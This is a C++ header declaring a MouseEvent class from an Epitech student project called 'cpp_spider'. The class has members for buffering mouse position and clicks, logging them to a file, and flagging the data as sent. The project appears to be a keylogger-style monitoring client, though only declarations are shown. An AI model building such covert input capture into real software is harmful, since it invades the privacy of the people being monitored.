/*
** MouseEvent.hpp for E:\cpp_spider in E:\cpp_spider\Client\Headers
**
** Made by august_t
** Login   <august_t@epitech.net>
**
** Started on  Fri Sep 29 11:57:45 2017 august_t
** Last update Sat Oct 07 16:04:28 2017 fagnol_r
*/

#ifndef _MOUSEEVENT_HPP_
#define _MOUSEEVENT_HPP_

#include "IEvent.hpp"

class   MouseEvent : public IEvent
{
private:
  // std::vector<PCURSORINFO> _CursorInfo;
  std::string _mouseBuffer;
  std::fstream  _logs;
  POINT       _position;
  char        _key;
  bool        _isSend;
  std::thread _t;
  // time_t      _time;
  // tm          *_tm;
  boost::mutex _mutex;
public:
  MouseEvent();
  ~MouseEvent();
  void getPos();
  void getCurrentClick();
  std::string getBuffer();
  void writeDataInFile();
  bool getSend();
  void setSend(bool send);
  void init();
};

#endif /* !_MOUSEEVENT_HPP_ */
